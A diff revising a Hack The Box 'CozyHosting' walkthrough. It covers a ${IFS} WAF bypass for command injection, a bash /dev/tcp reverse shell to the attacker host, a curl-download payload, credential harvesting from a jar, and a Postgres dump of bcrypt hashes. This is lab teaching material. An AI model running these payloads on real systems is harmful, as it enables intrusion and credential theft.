@@ -184,9 +184,9 @@ bash -i >& /dev/tcp/10.10.14.120/4444 0>&1
 and a white space error appear as if there is WAF preventing us from passing any white spaces into the username field.
 Looking online I found to methods to bypass this WAF rule:
 
-1- Replacing ' ' by ${IFS} <--Internal Field Separatorز
+1- Replacing ' ' by ${IFS} <--Internal Field Separator.
 
-2- Replacing ' ' by brace expansion using {cat,/etc/passwd} which will interpreted in the terminal as 'cat /etc/passwd'
+2- Replacing ' ' by brace expansion using {cat,/etc/passwd} which will interpreted in the terminal as 'cat /etc/passwd' [Brace Expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html).
 
 The space error did not appear once i used any of the two bypassing method above but for some reason I was not receiving a shell back in my listener.
 I tried a different command with ${IFS}, in my case ping command to send 1 packet back to my machine:
@@ -218,8 +218,7 @@ Since one-liner reverse shell (`bash -i >& /dev/tcp/...`) wasn't working through
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.120/1222 0>&1
 ```
-
-The current working directory had no write permissions, so I dropped the file into `/tmp` instead:
+Hosting it with `python3` server at port `111`and trying to write it to the current working directory but `app` user had no write permissions, so I dropped the file into `/tmp` instead:
 
 ```
 username=;curl${IFS}http://10.10.14.120:111/rev.sh${IFS}-o${IFS}/tmp/rev.sh;
@@ -242,39 +241,78 @@ However, the user app has no read permission over `/home/josh/user.txt`. Thus, w
 
 ## Digging Through the Application
 
-From the app directory, I pulled down `cloudhosting-0.0.1.jar` and unzipped it locally to inspect the source. A quick grep for credentials paid off:
+From the app directory, there is a single file `cloudhosting-0.0.1.jar` thus download it to my local machine and unzipped it to inspect the source. A quick grep for credentials paid off:
 
-```
+```shell
+┌──(HoDHoD㉿kali)-[~/Desktop/HTB/CozyHosting]
+└─$ grep -r password . 2>/dev/null
+---snip---
 ./BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
 ```
 
-The full config confirmed a local PostgreSQL database:
+Reading the full file confirmed a local PostgreSQL database:
 
-```properties
+```shell
+┌──(HoDHoD㉿kali)-[~/Desktop/HTB/CozyHosting]
+└─$ cat BOOT-INF/classes/application.properties 
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
 spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
 spring.datasource.username=postgres
-spring.datasource.password=Vg&nvzAQ7XxR
+spring.datasource.password=Vg&nvzAQ7XxR  
 ```
 
-## Raiding the Database
+## Enumerating the Database
 
 Using those credentials to connect to Postgres from the reverse shell:
 
 ```bash
-psql -h localhost -p 5432 -d cozyhosting -U postgres -W
-```
+app@cozyhosting:/app$ psql -h localhost -p 5432 -d cozyhosting -U postgres -W
 
-The `users` table held bcrypt password hashes for two accounts:
+cozyhosting-# \dt
+         List of relations
+ Schema | Name  | Type  |  Owner   
+--------+-------+-------+----------
+ public | hosts | table | postgres
+ public | users | table | postgres
+(2 rows)
 
-```
+cozyhosting=# \x
+Expanded display is on.
+cozyhosting=# SELECT * FROM users LIMIT 3;     
+-[ RECORD 1 ]----------------------------------------------------------
 name     | kanderson
 password | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
 role     | User
-
+-[ RECORD 2 ]----------------------------------------------------------
 name     | admin
 password | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
 role     | Admin
+
+cozyhosting=# SELECT * FROM hosts LIMIT 3;
+-[ RECORD 1 ]----------------
+id       | 1
+username | kanderson
+hostname | suspicious mcnulty
+-[ RECORD 2 ]----------------
+id       | 5
+username | kanderson
+hostname | boring mahavira
+-[ RECORD 3 ]----------------
+id       | 6
+username | kanderson
+hostname | stoic varahamihira
+
 ```
+
+The `users` table held bcrypt password hashes for two accounts: `admin` and `kanderson`
 
 ## Cracking the Hash
 
@@ -315,14 +353,40 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ## Summary
-
-| Stage | Technique |
-|---|---|
-| Recon | Spring Boot fingerprinting via Whitelabel Error Page |
-| Enumeration | Actuator endpoint fuzzing (`/actuator/sessions`) |
-| Access | Session ID hijacking to reach `/admin` |
-| Foothold | OS command injection via `/executessh` |
-| Lateral movement | Credentials recovered from `.jar` source + Postgres DB dump |
-| Privilege escalation | `sudo` misconfiguration on `/usr/bin/ssh` (GTFOBins) |
+The below summery is to recap the journey of hacking this machine.
+<table>
+  <thead>
+    <tr>
+      <th>Stage</th>
+      <th>Technique</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Recon</td>
+      <td>Spring Boot fingerprinting via Whitelabel Error Page</td>
+    </tr>
+    <tr>
+      <td>Enumeration</td>
+      <td>Actuator endpoint fuzzing (<code>/actuator/sessions</code>)</td>
+    </tr>
+    <tr>
+      <td>Access</td>
+      <td>Session ID hijacking to reach <code>/admin</code></td>
+    </tr>
+    <tr>
+      <td>Foothold</td>
+      <td>OS command injection via <code>/executessh</code></td>
+    </tr>
+    <tr>
+      <td>Lateral movement</td>
+      <td>Credentials recovered from <code>.jar</code> source + Postgres DB dump</td>
+    </tr>
+    <tr>
+      <td>Privilege escalation</td>
+      <td><code>sudo</code> misconfiguration on <code>/usr/bin/ssh</code> (GTFOBins)</td>
+    </tr>
+  </tbody>
+</table>
 
 CozyHosting is a great reminder of two things: how much Spring Boot Actuator endpoints can leak when they're left exposed, and how a single overly permissive `sudo` rule can undo an otherwise solid setup. Definitely a fun one for anyone practicing web-to-root chains.
